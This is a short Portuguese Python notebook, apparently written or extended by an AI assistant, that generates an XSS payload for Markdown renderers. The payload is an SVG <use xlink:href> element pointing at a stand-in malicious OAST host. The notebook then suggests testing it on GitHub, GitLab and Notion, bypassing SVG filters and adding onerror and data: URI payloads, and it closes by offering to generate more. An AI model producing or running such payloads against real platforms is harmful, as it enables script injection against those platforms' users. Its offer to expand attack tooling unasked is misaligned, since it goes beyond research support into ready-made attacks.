# %% [markdown]
# # Gerador de Payloads XSS via Markdown
#
# Notebook criado para pesquisa de payloads XSS que exploram renderização de Markdown.
#
# **Autor:** Lopseg (adaptado)
#
# Execute a célula abaixo para ver o payload de exemplo.

# %%
print("=== Payload XSS via Markdown SVG (exemplo) ===\n")

payload = '''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<use xlink:href="http://seu-dominio-malicioso.oast.fun/assets/icons.svg#xss"/>
</svg>'''

print(payload)
print("\nEste payload explora o uso de <use> + xlink:href em renderizadores Markdown que permitem SVG inline.")

# %% [markdown]
# ## Próximos passos sugeridos para sua pesquisa de cybersecurity:
#
# 1. Testar em plataformas que renderizam Markdown (GitHub, GitLab, Notion, etc.)
# 2. Gerar variações com diferentes domínios OAST (Interactsh, Burp Collaborator, etc.)
# 3. Testar bypasses de filtros de SVG
# 4. Adicionar mais células com payloads avançados (onerror, data: URI, etc.)
#
# Quer que eu adicione mais payloads ou crie funções para gerar payloads automaticamente?
